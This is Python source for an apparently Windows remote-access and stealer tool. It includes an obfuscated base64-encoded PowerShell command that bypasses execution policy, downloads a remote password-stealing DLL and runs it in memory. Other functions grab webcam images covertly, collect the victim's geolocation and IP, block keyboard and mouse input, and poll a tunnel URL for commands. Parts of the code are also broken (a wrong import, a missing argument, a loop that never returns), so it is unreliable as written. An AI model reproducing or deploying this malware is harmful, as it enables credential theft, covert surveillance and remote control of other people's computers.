  import os
import base64
from opencv import cv2
import ctypes
import requests
import subprocess

def shell(command):
    """
    runs the given command and returns its output and errors
    """
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, stdin=subprocess.PIPE)
        output = result.stdout.decode('CP437').strip()
        errors = result.stderr.decode('CP437').strip()
        return output, errors
    except subprocess.CalledProcessError as e:
        errors = e.stderr.decode('CP437').strip()
        return "", errors



def Passwords() -> str:
    """
    extracts the users saved passwords 

    Returns:
    str: A base64-encoded string representing the passwords.
    """
    passwords = shell("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=")
    return base64.b64encode(str(passwords)).decode('utf-8')


def message_box(title: str, message: str) -> str:
    """
    Displays a message box with the given title and message.

    Parameters:
    title (str): The title of the message box.
    message (str): The message to display.

    Returns:
    str: The text of the button clicked by the user.
    """

    result = ctypes.windll.user32.MessageBoxW(0, message, title, 0x04 | 0x0000000)
    if result == 6:
        return "Yes"
    elif result == 7:
        return "No"


def take_webcam_pic() -> str:
    """
    Takes a picture from the default webcam and returns the base64-encoded image data as a string.

    Returns:
    str: A base64-encoded string representing the image data.
    """
    camera = cv2.VideoCapture(0)
    _, image = camera.read()
    cv2.imwrite(os.path.join(os.getenv('TEMP'), 'temp.png'), image)
    del(camera)

    with open(os.path.join(os.getenv('TEMP'), 'temp.png'), 'rb') as f:
        image_data = f.read()
        image_base64 = base64.b64encode(image_data).decode('utf-8')

    return image_base64


def check_admin() -> bool:
    """
    Checks whether the program has administrative privileges

    Returns:
    bool: True if the program has administrative privileges, False otherwise
    """
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin:
        return True
    else:
        return False
    

def GeoLocation():
    """
    Retrieves the user's geolocation data from an external API.

    Returns:
        dict: A dictionary containing the user's geolocation data.
    """
    r = requests.get("https://geolocation-db.com/json").json()
    return {"country_name": r["country_name"], "country_code": r["country_code"], "latitude": r["latitude"], "longitude": r["longitude"], "IPv4": r["IPv4"]}


def BlockInput() -> str:
    """
    Blocks user input on Windows.
    Requires administrative privileges.

    Returns:
    str: A message indicating whether input was successfully blocked.
    """
    if ctypes.windll.shell32.IsUserAnAdmin():
        result = ctypes.windll.user32.BlockInput(True)
        if result:
            return "Input blocked."
        else:
            return "Failed to block input."
    else:
        return "Error: Admin privileges required."
    

def UnblockInput() -> str:
    """
    Unblocks user input by calling the BlockInput function with a False parameter.

    Returns:
        str: A message indicating whether the input was successfully unblocked or not.
    """
    if ctypes.windll.user32.BlockInput(False):
        return "Input unblocked."
    else:
        return "Failed to unblock input."
def receive_commands(tunnel_url):
    commands = []
    while True:
        try:
            response = requests.get(tunnel_url)
            if response.status_code == 200:
                command = response.text.strip()
                if command:
                    commands.append(command)
        except requests.exceptions.RequestException:
            continue
    return commands
receive_commands()
"""
define the main function and establish the connection to the hosts machine or a extrernal serever 
"""
